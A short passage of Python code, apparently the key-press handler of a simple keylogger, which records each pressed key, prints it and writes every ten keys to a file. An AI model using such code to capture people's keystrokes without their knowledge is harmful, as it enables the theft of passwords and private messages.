    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed.".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []